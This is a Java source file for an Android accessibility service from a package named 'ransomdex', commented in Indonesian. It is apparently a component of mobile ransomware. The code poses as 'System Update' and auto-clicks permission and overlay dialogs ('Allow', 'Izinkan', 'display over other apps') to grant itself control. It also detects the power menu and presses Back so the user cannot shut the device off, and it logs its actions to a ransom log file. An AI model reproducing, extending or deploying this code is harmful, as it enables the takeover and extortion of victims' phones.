package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected");

        // Langsung arahkan ke pengaturan Overlay setelah aksesibilitas aktif
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }, 500);
    }

    private void writeLog(String text) {
        try {
            File logFile = new File("/sdcard/log_ransom.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            String time = Calendar.getInstance().getTime().toString();
            fos.write((time + " : " + text + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        writeLog("Event: " + event.getEventType());

        // Deteksi jika menu Power muncul (biasanya dikelola oleh sistem)
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (packageName.equals("android") || packageName.contains("systemui")) {
            // Jika ada teks terkait mematikan daya, langsung tekan Back
            checkAndDismissPowerMenu(getRootInActiveWindow());
        }

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // Logika "Auto-Clicker"
        // 1. Cari nama aplikasi di daftar "Display over other apps" jika terlempar ke list
        checkAndClick(rootNode, "System Update");

        // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
        checkAndClick(rootNode, "Activate");
        checkAndClick(rootNode, "Aktifkan");
        checkAndClick(rootNode, "Allow");
        checkAndClick(rootNode, "Izinkan");

        // Kata kunci untuk halaman Overlay/Display over other apps
        checkAndClick(rootNode, "Permit drawing over other apps");
        checkAndClick(rootNode, "Allow display over other apps");
        checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
        checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
        
        rootNode.recycle();
    }

    private void checkAndDismissPowerMenu(AccessibilityNodeInfo node) {
        if (node == null) return;
        // Mencari kata kunci yang ada di menu power
        if (!node.findAccessibilityNodeInfosByText("Power off").isEmpty() || 
            !node.findAccessibilityNodeInfosByText("Restart").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Mulai lagi").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Daya mati").isEmpty()) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) {
                AccessibilityNodeInfo clickableNode = n;
                // Cari parent yang bisa diklik jika teksnya sendiri tidak clickable
                while (clickableNode != null && !clickableNode.isClickable()) {
                    clickableNode = clickableNode.getParent();
                }

                if (clickableNode != null && clickableNode.isClickable()) {
                    writeLog("Auto-clicking target for: " + text);
                    clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    
                    // Setelah berhasil klik izin overlay, coba kembali ke aplikasi
                    if (text.toLowerCase().contains("permit") || text.toLowerCase().contains("allow") || text.contains("Izinkan")) {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                    }
                }
                n.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {}
}